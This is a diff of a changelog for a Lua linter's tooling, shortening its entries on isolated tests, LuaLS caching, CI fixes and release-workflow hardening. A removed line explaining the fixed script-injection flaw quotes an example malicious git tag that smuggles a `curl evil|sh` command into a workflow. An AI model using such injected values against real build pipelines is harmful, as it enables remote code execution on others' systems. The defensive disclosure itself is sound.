@@ -21,53 +21,46 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 - Weekly checking cadence for LuaLS updates in `src/luals.ts` tracking ISO week in `metadata.json` (`lastCheckedWeek`), eliminating redundant GitHub API requests on every invocation.
 - Automatic cleanup helper `cleanupOldCachedLuaLSVersions()` removing older cached LuaLS version directories when a newer version is downloaded or verified.
 - Dedicated unit test suite `tests/unit/luals-cache.test.ts` verifying weekly ISO week caching, metadata parsing, cache discovery, error recovery, and older version purging.
-- Isolated test harness (`tests/global-setup.ts`, `tests/helpers/test-cache.ts`, `tests/helpers/live.ts`): every Vitest run now uses its own temporary cache/temp directory tree, so tests can never read from or write to the developer's real `~/.cache/nanos-lint`.
-- Shared live-test fixtures: `tests/global-setup.ts` downloads the LuaLS binary and the nanos world annotations file exactly once per run, before any worker starts, and `tests/helpers/live.ts` memoizes the resolution per worker so concurrent tests await the same download instead of racing into their own.
-- `tests/helpers/download-counter.ts` plus a Vitest `setupFiles` hook that records every real LuaLS archive download of a run and fails the run when the shared binary is downloaded more than once.
-- `cacheDir` option for `resolveLuaLSBinary()` and `findExistingLuaLSDir()`, and `cacheDir`/`reuseExisting` passthrough for `downloadAndExtractLuaLS()`, allowing callers (including the test suite) to use a fully isolated LuaLS cache.
-- `NANOS_LIVE_TESTS=0` offline test mode that skips the live LuaLS/annotations suites, performs no network access, and disables the coverage thresholds.
-- Per-file coverage floor for `src/luals.ts` in `vitest.config.ts` so a large regression in the download/caching logic cannot be masked by the fully covered helper modules.
-- Architecture verification for every bundled LuaLS binary in the release packaging step (`.github/workflows/release.yml`): the ELF/Mach-O/PE header of each binary is inspected so an arm64 package can never ship an x64 binary (or vice versa) even though the release job runs on x64.
-- `.gitattributes` forcing LF line endings for `.githooks/**` and shell scripts (and CRLF for `*.cmd`/`*.bat`) so the pre-commit hook also runs on Windows with Git for Windows.
-- Regression test `tests/unit/luals-warm-cache.test.ts` asserting that resolving a warm weekly cache validates exactly one binary instead of spawning LuaLS once per cached version.
+- Isolated test harness (`tests/global-setup.ts`, `tests/helpers/`): each run uses its own cache/temp tree, so tests never read or write the real `~/.cache/nanos-lint`.
+- One shared LuaLS/annotations download per run in the global setup, memoized per worker, plus a counter that fails the run when LuaLS is downloaded more than once.
+- `cacheDir` and `reuseExisting` options for `resolveLuaLSBinary()`, `findExistingLuaLSDir()`, and `downloadAndExtractLuaLS()`.
+- `NANOS_LIVE_TESTS=0` offline test mode (no network access, coverage thresholds disabled).
+- Per-file coverage floor for `src/luals.ts` in `vitest.config.ts`.
+- Architecture check (ELF/Mach-O/PE header) for every bundled LuaLS binary in the release packaging step; real arm64 execution is covered by the `ubuntu-26.04-arm` CI job.
+- `.gitattributes` keeping `.githooks/**` and shell scripts on LF (and `*.cmd`/`*.bat` on CRLF).
+- Regression test asserting that a warm weekly cache validates exactly one binary.
 
 ### Changed
-- Replaced direct `console.log`, `console.warn`, and `console.error` calls across the codebase with centralized `logger` methods.
-- Updated all `catch` blocks across `src/annotations.ts`, `src/cli.ts`, `src/config.ts`, `src/luals.ts`, `src/reporter.ts`, and `src/types.ts` to log errors at appropriate log levels (`debug`, `warn`, or `error`), ensuring no errors are silently swallowed.
-- `downloadAndExtractLuaLS()` now reuses an existing LuaLS installation (legacy cache location or package-bundled distribution) instead of re-downloading the archive, and the test suite no longer downloads the binary once per test file.
-- Updated `AGENTS.md` guidelines instructing agents to systematically update `CHANGELOG.md` under `## [Unreleased]` after making changes, and to review, verify, and promote unreleased entries when preparing and publishing releases.
-- Migrated `eslint.config.mjs` from deprecated `tseslint.config()` to ESLint core's native `defineConfig()` from `eslint/config`.
-- `resolveLuaLSBinary()` now reuses the cached latest LuaLS when checked within the same week, checks for updates weekly when unpinned, and gracefully falls back to existing cache if offline.
-- `resolveLuaLSBinary()` now checks the weekly metadata fast path before enumerating the cache, so the common warm-cache path performs a single binary validation instead of spawning LuaLS once for every cached version.
-- The command result writer in `src/cli.ts` is now gated by the log level: `--log-level=silent` suppresses the diagnosis report and command output (only the exit code remains), while `--quiet`/`--log-level=error` still print the report and suppress only progress messages.
-- `src/logger.ts` no longer reads a bare `LOG_LEVEL` environment variable (commonly set by CI images for unrelated tooling); only `NANOS_LOG_LEVEL` is honored.
-- CI test matrix: dropped the 1-vCPU `ubuntu-slim` runner (hard 15-minute job limit) that could silently block every release, since `release.yml` only fires when CI concludes successfully. Linux x64 remains covered by `ubuntu-latest`.
-- GitHub Actions cache keys in `.github/workflows/ci.yml` and `action.yml` now include the current ISO week so the entry is refreshed instead of being restored forever without ever being saved again; the previously dead restore-key prefixes (`luals-*`, and the exact-key-plus-dash form) were replaced with working prefixes.
-- `action.yml` fallback execution pins `npx --yes nanos-lint@2.6.1` exactly instead of the `^2.6.1` range, so a caller pinning an action tag can no longer execute a different minor version.
-- Test suite modernized: previously vacuous/conditional assertions in `tests/unit/luals-cache.test.ts`, `tests/unit/luals-utils.test.ts`, `tests/unit/cli.test.ts`, `tests/unit/config.test.ts`, and `tests/unit/regressions.test.ts` were replaced with deterministic assertions, missing fixtures are now asserted instead of silently skipped, `mockClear()` is used between flag variants, and the `-i/--ignore` regression test drives the real CLI instead of a locally built Commander program.
-- `README.md` now documents the test-suite environment variables (`NANOS_LIVE_TESTS`, `NANOS_TEST_CACHE_ROOT`), the single shared LuaLS download per run, and the isolated test cache; the runtime environment variable table links to it.
+- `resolveLuaLSBinary()` checks the weekly metadata before enumerating the cache, so the warm path validates one binary instead of spawning LuaLS once per cached version.
+- `--log-level=silent` now suppresses the diagnosis report and command output too; `--quiet`/`--log-level=error` still print the report and hide only progress.
+- `src/logger.ts` reads only `NANOS_LOG_LEVEL`, no longer a bare `LOG_LEVEL`.
+- CI matrix: dropped the 1-vCPU `ubuntu-slim` runner; Linux x64 stays covered by `ubuntu-latest`.
+- Cache keys in `.github/workflows/ci.yml` and `action.yml` include the ISO week so entries refresh, and the dead restore-key prefixes were fixed.
+- `action.yml` falls back to the exact `npx --yes nanos-lint@2.6.1` instead of the `^2.6.1` range.
+- Tests modernized: vacuous/conditional assertions replaced, missing fixtures asserted instead of skipped, `mockClear()` between flag variants, and the `-i/--ignore` test drives the real CLI.
+- `README.md` documents the test-suite variables and the shared download; the runtime environment variable table links to them.
 
 ### Removed
 - 1-vCPU `ubuntu-slim` runner from the CI test matrix.
 
 ### Fixed
-- **Test suite is now hermetic**: unit and integration tests no longer mutate the developer's real user cache (previously `writeLuaLSMetadata()`, `findExistingLuaLSDir()`, and cache-migration tests used the shared cache directory), no longer leave a stray `../invalid` directory in the system temporary directory, and no longer depend on a pre-warmed cache.
-- **Single shared LuaLS download**: the live tests previously resolved (and therefore downloaded) LuaLS repeatedly — once per test file and once more in the `regressions.test.ts` `beforeAll`. A single download per run is now performed by the global setup and enforced by the download counter.
-- **No more silently skipped tests**: `tests/unit/regressions.test.ts` no longer wraps its whole file in a `beforeAll` whose failure turned "29 tests" into "29 skipped"; missing live fixtures now fail loudly, and live-only suites are explicitly gated with `describe.skipIf`/`it.skipIf` driven by `NANOS_LIVE_TESTS`.
-- **Script injection in the release workflow**: `github.event.inputs.tag` and `steps.tag.outputs.tag_name` were interpolated directly into `run:` script text (`.github/workflows/release.yml`), so a tag such as `v1.2.3";curl evil|sh;#` would have been executed. All untrusted values are now passed through `env:` and referenced as quoted shell variables, and the GitHub token is read from the environment inside the embedded Node script.
-- **Release tag detection**: the tag pattern is now end-anchored (`^v?[0-9]+\.[0-9]+\.[0-9]+$`) so values like `v1.2.3-evil` are rejected, and the pipeline no longer fails the step when HEAD carries no release tag (the default `bash -e -o pipefail` turned the expected "no tag" case into a failure).
-- **Tag/version mismatch**: the release workflow now fails before packaging or publishing when the detected tag does not match `package.json`'s version, preventing mislabeled archives and an npm publish of a version nobody requested.
-- **`workflow_run` branch filter**: removed the `branches: [master, main]` filter that silently dropped CI runs triggered by tag pushes (where `workflow_run.head_branch` is the tag name), leaving releases dependent on a racy branch-push run.
-- **OIDC token scope**: `id-token: write` is no longer granted workflow-wide; npm publishing moved to a dedicated job so the third-party release action and every download step can no longer mint OIDC tokens.
-- **Cache keys**: fixed write-once `actions/cache` entries whose restore keys could never match the exact key they wrote (both in `.github/workflows/ci.yml` and `action.yml`).
-- **`--log-level=silent`**: the CLI printed the full diagnosis report and command output regardless of the log level; those paths now respect `silent`.
-- Unit tests that reached the network or the system cache during LuaLS resolution now inject an isolated cache directory, and the `resolveLuaLSBinary()` test for the offline fallback now actually exercises the fallback download path instead of an unrelated explicit-version path.
-- Wall-clock budgets in `tests/unit/config.test.ts` (ReDoS regression guards) were raised to a wide margin so the checks cannot flake on slow CI runners while still failing on a real complexity regression.
-- **Windows CI**: the file-scoped diagnostic assertion in `tests/unit/luals-utils.test.ts` now resolves and lower-cases both paths before comparing (exactly like `runLuaLSCheck()` filters them), instead of comparing the forward-slash path returned by `fileUriToPath()` against a backslash Windows path.
+- Test suite hermetic: no user-cache mutation, no stray `../invalid` directory, no dependency on a pre-warmed cache.
+- Single shared LuaLS download per run (previously one per test file plus a `regressions.test.ts` `beforeAll`).
+- `tests/unit/regressions.test.ts` no longer degrades to "29 skipped" when its `beforeAll` fails.
+- **Script injection in the release workflow**: untrusted tag values and the GitHub token now pass through `env:` instead of being interpolated into `run:` text.
+- Release tag detection is end-anchored and no longer fails on commits without a release tag under `bash -e -o pipefail`.
+- The release fails when the tag does not match `package.json`'s version.
+- Removed the `workflow_run` `branches` filter that dropped tag-triggered CI runs.
+- `id-token: write` is scoped to the npm publish job.
+- Write-once `actions/cache` entries whose restore keys could never match the key they wrote.
+- `--log-level=silent` is now respected by the report and command output.
+- LuaLS resolution tests inject an isolated cache, and the offline-fallback test exercises the fallback download path.
+- ReDoS regression budgets in `tests/unit/config.test.ts` widened to avoid CI flakes.
+- Windows CI: the file-scoped diagnostic assertion normalizes path separators and case.
 
 ### Security
-- Hardened `.github/workflows/release.yml` against command injection from workflow dispatch inputs and detected git tags by removing every `${{ }}` expression from `run:` script text.
-- Scoped `id-token: write` to the npm publish job only, so the release job and its third-party actions can no longer mint OIDC tokens.
+- Hardened `.github/workflows/release.yml` against command injection: no `${{ }}` expression remains in any `run:` script text.
+- Scoped `id-token: write` to the npm publish job, so the release job and its third-party actions cannot mint OIDC tokens.
 
 ## [2.6.1] - 2026-09-23
 
